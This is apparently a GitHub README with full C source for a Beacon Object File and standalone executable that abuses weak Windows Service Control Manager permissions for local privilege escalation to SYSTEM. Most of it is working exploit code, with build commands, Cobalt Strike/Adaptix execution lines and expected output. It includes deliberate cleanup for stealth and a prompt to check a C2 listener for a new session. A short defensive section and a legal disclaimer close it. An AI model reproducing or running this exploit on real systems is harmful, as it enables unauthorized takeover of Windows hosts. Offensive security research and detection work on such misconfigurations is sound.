# SvcModPrivesc

A Beacon Object File (BOF) and Standalone executable to exploit weak Service Control Manager (SCM) permissions for Local Privilege Escalation (LPE).

## Background

When the Service Control Manager (SCM) has a weak Discretionary Access Control List (DACL), such as `D:(A;;KA;;;WD)` (Everyone: Full Control), low-privileged users can create new services. 

However, on modern versions of Windows (Server 2019+), attempting to privesc via `sc.exe` often fails:

1.  **Creation Succeeds:** `sc.exe create` works because the SCM allows it.
2.  **Start Fails:** `sc.exe start` returns `Access Denied` (Error 5).
3.  **Cleanup Fails:** `sc.exe delete` returns `Access Denied` (Error 5).

This creates "Zombie Services" that clutter the registry and cannot be managed.

### Why `sc.exe` Fails

While the misconfiguration grants `SC_MANAGER_ALL_ACCESS` to the SCM database, Windows applies a **Hardened Default Security Descriptor** to any new service object created.

This default descriptor typically grants the Creator:
- `SERVICE_QUERY_STATUS`
- `SERVICE_CHANGE_CONFIG` (sometimes)

But **denies**:
- `SERVICE_START`
- `DELETE`
- `WRITE_DAC` (needed to fix permissions)

Because standard `sc.exe` does not allow specifying a custom Security Descriptor during creation, the operator is locked out of the service they just created.

## The Solution

`SvcModPrivesc` bypasses this restriction by calling the Windows API `CreateServiceW` directly with a custom `SECURITY_ATTRIBUTES` structure.

It forces the new service to be created with the SDDL: `D:(A;;KA;;;WD)` (Everyone: Full Control).

This ensures that the Creator (and Everyone else) has the `SERVICE_START` right immediately, allowing for instant privilege escalation to `SYSTEM`.

## Features

-   **Bypasses Default Hardening:** Injects a custom weak DACL at creation time.
-   **Clean Exit:** Automatically marks the service for deletion after execution (or failure).
-   **BOF Support:** Runs inline within Cobalt Strike / Adaptix / other C2s supporting the BOF spec.
-   **Standalone Support:** Can be compiled as a standard EXE for local testing.

## Usage

### 1. Check for Vulnerability
Run the following to check if the SCM allows modification by "Everyone" (WD):
```powershell
sc.exe sdshow scmanager
# Look for: D:(A;;KA;;;WD)
```

### 2. Compilation

**BOF (for C2):**
```bash
x86_64-w64-mingw32-gcc -c svcmodprivesc.c -o svcmodprivesc.x64.o -masm=intel
```

**Standalone EXE:**
```bash
x86_64-w64-mingw32-gcc svcmodprivesc.c -o svcmodprivesc.exe -ladvapi32
```

### 3. Execution

**BOF (Adaptix/Cobalt Strike):**
```powershell
svcmodprivesc -svcname PwnService -path C:\Users\Public\beacon.exe
```

**Standalone EXE:**
```powershell
.\svcmodprivesc.exe
```

## Expected Output

Upon execution, you will likely see:
```text
[+] Opened SCM with ALL_ACCESS.
[+] Service Created with Weak DACL (Everyone: FullControl).
[*] Starting Service...
[-] StartService failed: 1053
```

**Error 1053 is normal.**
This error ("The service did not respond to the start or control request in a timely fashion") occurs because your payload is a standard executable, not a Windows Service that reports status to the SCM. Despite the error, the process is launched as `SYSTEM`.

## Defensive Considerations

1.  **Monitor SCM Auditing:** Look for Event ID 4673 (Sensitive Privilege Use) or specific Service Control Manager events where non-administrators create services.
2.  **Verify Permissions:** Regularly audit `sc.exe sdshow scmanager` to ensure `WD` (Everyone) or `AU` (Authenticated Users) do not have excessive rights.
3.  **Key Mitigation:** Ensure `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ServiceGroupOrder` and service registry keys are restricted to Administrators and SYSTEM.

## License
MIT

## Credits
*   Concept & Development: Based on Windows SCM permission abuse research.
*   Inspired by classic weak service permission exploits.

```C
/*
 * svcpwn.c - LPE via Weak SCManager Permissions
 *
 * USAGE: svcpwn.exe
 *
 * SUMMARY:
 * This tool exploits a misconfiguration where "Everyone" has Full Control (KA)
 * over the Service Control Manager (SCM). It creates a new service with a
 * custom "weak" security descriptor that allows us (the creator) to start it,
 * bypassing the default Windows hardening that usually prevents this.
 */

#include <windows.h>
#include <sddl.h>   // Required for SDDL string conversion functions
#include <stdio.h>

// ------------------------------------------------------------
// 1. API DEFINITIONS (Function Pointer Typedefs)
// ------------------------------------------------------------
// In C, to use functions from a DLL dynamically (though here we link statically
// for simplicity in a standalone exe), we define their signatures.
// These define the "shape" of the function (return type, arguments).

typedef SC_HANDLE (WINAPI * OpenSCManagerW_t)(LPCWSTR, LPCWSTR, DWORD);
typedef SC_HANDLE (WINAPI * CreateServiceW_t)(SC_HANDLE, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD, DWORD, LPCWSTR, LPCWSTR, LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR);
typedef SC_HANDLE (WINAPI * OpenServiceW_t)(SC_HANDLE, LPCWSTR, DWORD);
typedef BOOL     (WINAPI * StartServiceW_t)(SC_HANDLE, DWORD, LPCWSTR*);
typedef BOOL     (WINAPI * DeleteService_t)(SC_HANDLE);
typedef BOOL     (WINAPI * CloseServiceHandle_t)(SC_HANDLE);

// This function is crucial. It converts a text string (SDDL) like "D:(A;;KA;;;WD)"
// into a binary Security Descriptor that Windows APIs can understand.
typedef BOOL     (WINAPI * ConvertStringSecurityDescriptorToSecurityDescriptorW_t)(LPCWSTR, DWORD, PSECURITY_DESCRIPTOR, PULONG);
typedef HLOCAL   (WINAPI * LocalFree_t)(HLOCAL);

// ------------------------------------------------------------
// 2. CONSTANTS
// ------------------------------------------------------------
// SDDL (Security Descriptor Definition Language) is a text format for defining permissions.
// We want to grant "Everyone" full control so we can start the service later.
// D:      -> DACL (Discretionary Access Control List)
// (A      -> Allow Ace
// ;;      -> No specific inheritance flags
// KA      -> Key All Access (maps to Standard Rights All + Specific Rights All for services)
// ;;;     -> No object GUIDs
// WD      -> World (Everyone) - SID S-1-1-0
#define SDDL_EVERYONE_FULL_CONTROL L"D:(A;;KA;;;WD)"
#define SDDL_REVISION_1 1

// ------------------------------------------------------------
// 3. MAIN ENTRY POINT
// ------------------------------------------------------------
int main() {
    SC_HANDLE hScm = NULL;      // Handle to the Service Control Manager
    SC_HANDLE hSvc = NULL;      // Handle to the created service
    PSECURITY_DESCRIPTOR pSD = NULL; // Pointer to the binary security descriptor
    SECURITY_ATTRIBUTES sa;     // Structure to pass security info to CreateService
    
    // Configuration for the service
    LPCWSTR svcName = L"PwnService";
    LPCWSTR svcPath = L"C:\\Users\\itemployee11\\Desktop\\netmon.exe"; // CHANGE THIS PATH

    // 1. RESOLVE APIs
    // We get the addresses of the functions from advapi32.dll.
    // This is standard practice to ensure we can call them.
    OpenSCManagerW_t pOpenSCManagerW = (OpenSCManagerW_t)GetProcAddress(GetModuleHandleA("advapi32"), "OpenSCManagerW");
    CreateServiceW_t pCreateServiceW = (CreateServiceW_t)GetProcAddress(GetModuleHandleA("advapi32"), "CreateServiceW");
    OpenServiceW_t pOpenServiceW = (OpenServiceW_t)GetProcAddress(GetModuleHandleA("advapi32"), "OpenServiceW");
    StartServiceW_t pStartServiceW = (StartServiceW_t)GetProcAddress(GetModuleHandleA("advapi32"), "StartServiceW");
    DeleteService_t pDeleteService = (DeleteService_t)GetProcAddress(GetModuleHandleA("advapi32"), "DeleteService");
    CloseServiceHandle_t pCloseServiceHandle = (CloseServiceHandle_t)GetProcAddress(GetModuleHandleA("advapi32"), "CloseServiceHandle");
    ConvertStringSecurityDescriptorToSecurityDescriptorW_t pConvertSDDL = (ConvertStringSecurityDescriptorToSecurityDescriptorW_t)GetProcAddress(GetModuleHandleA("advapi32"), "ConvertStringSecurityDescriptorToSecurityDescriptorW");
    LocalFree_t pLocalFree = (LocalFree_t)GetProcAddress(GetModuleHandleA("kernel32"), "LocalFree");

    if (!pOpenSCManagerW || !pCreateServiceW || !pStartServiceW || !pConvertSDDL) {
        printf("[-] Failed to resolve APIs.\n");
        return 1;
    }

    // --------------------------------------------------------
    // STEP 1: Open the Service Control Manager (SCM)
    // --------------------------------------------------------
    // We request SC_MANAGER_ALL_ACCESS.
    // Normally this would fail for a low-privileged user.
    // However, the machine is misconfigured with SDDL "D:(A;;KA;;;WD)" on the SCM,
    // which grants "Everyone" (WD) full access.
    // --------------------------------------------------------
    hScm = pOpenSCManagerW(
        NULL,                   // Local machine
        NULL,                   // Active Database (SERVICES_ACTIVE_DATABASE)
        SC_MANAGER_ALL_ACCESS   // Request ALL permissions (Create, Delete, Enum, etc.)
    );

    if (!hScm) {
        printf("[-] OpenSCManagerW failed. The SCManager likely does not have weak permissions.\n");
        return 1;
    }
    printf("[+] Opened SCM with ALL_ACCESS.\n");

    // --------------------------------------------------------
    // STEP 2: Create the Security Descriptor (The "Secret Sauce")
    // --------------------------------------------------------
    // We want to create a service that WE can start.
    // By default, Windows creates services with restricted permissions.
    // We bypass this by providing our own SECURITY_ATTRIBUTES structure.
    // --------------------------------------------------------
    
    // Convert the SDDL string "D:(A;;KA;;;WD)" into a binary Security Descriptor.
    if (!pConvertSDDL(SDDL_EVERYONE_FULL_CONTROL, SDDL_REVISION_1, &pSD, NULL)) {
        printf("[-] SDDL conversion failed: %lu\n", GetLastError());
        pCloseServiceHandle(hScm);
        return 1;
    }
    
    // Initialize the SECURITY_ATTRIBUTES structure.
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = pSD; // Assign our custom "Weak" descriptor
    sa.bInheritHandle = FALSE;

    // --------------------------------------------------------
    // STEP 3: Create the Service
    // --------------------------------------------------------
    // We create a new service.
    // Crucially, we pass 'sa' (Security Attributes) which contains our weak descriptor.
    // This forces the new service to allow "Everyone" to control it.
    // --------------------------------------------------------
    hSvc = pCreateServiceW(
        hScm, 
        svcName,                // Internal Service Name
        NULL,                   // Display Name (NULL means same as Service Name)
        SERVICE_ALL_ACCESS,     // Access rights when creating the handle
        SERVICE_WIN32_OWN_PROCESS, // Service runs in its own process
        SERVICE_DEMAND_START,   // Must be started manually (sc start)
        SERVICE_ERROR_IGNORE,   // Ignore errors if the binary fails
        svcPath,                // PATH TO YOUR BINARY
        NULL,                   // No load ordering group
        NULL,                   // No tag identifier
        NULL,                   // No dependencies
        NULL,                   // LocalSystem account (SYSTEM privileges)
        NULL                    // No password
    );

    // Error Handling for CreateService
    if (!hSvc) {
        DWORD dwErr = GetLastError();
        if (dwErr == ERROR_SERVICE_EXISTS) {
            printf("[!] Service exists. Attempting to Open/Delete/Recreate...\n");
            
            // If it exists, we open it with DELETE permissions to remove it first.
            hSvc = pOpenServiceW(hScm, svcName, SERVICE_ALL_ACCESS);
            if (hSvc) {
                pDeleteService(hSvc);
                pCloseServiceHandle(hSvc);
                hSvc = NULL;
                
                // Attempt creation again
                hSvc = pCreateServiceW(hScm, svcName, NULL, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, svcPath, NULL, NULL, NULL, NULL, NULL);
                if (!hSvc) {
                     printf("[-] CreateService failed after deletion: %lu\n", GetLastError());
                     goto cleanup;
                }
            } else {
                printf("[-] OpenService failed for existing service: %lu\n", GetLastError());
                goto cleanup;
            }
        } else {
            printf("[-] CreateServiceW failed: %lu\n", dwErr);
            goto cleanup;
        }
    }
    
    printf("[+] Service Created with Weak DACL (Everyone: FullControl).\n");

    // --------------------------------------------------------
    // STEP 4: Start the Service
    // --------------------------------------------------------
    // Since we applied the weak DACL (Everyone: FullControl), we have the
    // SERVICE_START right. This call tells the SCM to launch our binary.
    // --------------------------------------------------------
    printf("[*] Starting Service...\n");
    if (!pStartServiceW(hSvc, 0, NULL)) {
        DWORD dwErr = GetLastError();
        
        // ERROR_SERVICE_REQUEST_TIMEOUT (1053) is expected for Beacon/EXE files.
        // The SCM waits for the binary to report "Started". Beacon doesn't do that.
        // The SCM times out and returns 1053, but the process IS already running.
        if (dwErr == ERROR_SERVICE_REQUEST_TIMEOUT) {
             printf("[!] StartService returned 1053 (Timeout). This is expected for non-service binaries.\n");
             printf("[+] Check your listener for a new session!\n");
        } else {
             printf("[-] StartService failed: %lu\n", dwErr);
        }
    } else {
        printf("[+] Service Started successfully.\n");
    }

    // --------------------------------------------------------
    // STEP 5: Cleanup
    // --------------------------------------------------------
    // We mark the service for deletion.
    // The SCM will delete the registry keys and cleanup after the process ends
    // or on next reboot. This keeps us stealthy.
    // --------------------------------------------------------
    if (hSvc) {
        pDeleteService(hSvc); 
        printf("[*] Service marked for deletion.\n");
    }

cleanup:
    // Release all handles and memory to prevent leaks
    if (hSvc) pCloseServiceHandle(hSvc);
    if (hScm) pCloseServiceHandle(hScm);
    if (pSD) pLocalFree(pSD); // Free the binary security descriptor

    return 0;
}
```

### ⚠️ Disclaimer / Legal Warning

This tool is intended for EDUCATIONAL and AUTHORIZED TESTING purposes only.

- Authorization Required: Do not use this tool on systems you do not own or do not have explicit written permission to test. Unauthorized access to computer systems is a criminal offense in most jurisdictions.

- No Warranty: This software is provided "as is", without warranty of any kind, express or implied. The author is not liable for any damages or legal consequences arising from the use or misuse of this software.

- Responsibility: The user assumes full responsibility for compliance with all applicable laws and regulations in their jurisdiction.
By using this code, you agree to use it responsibly and ethically.
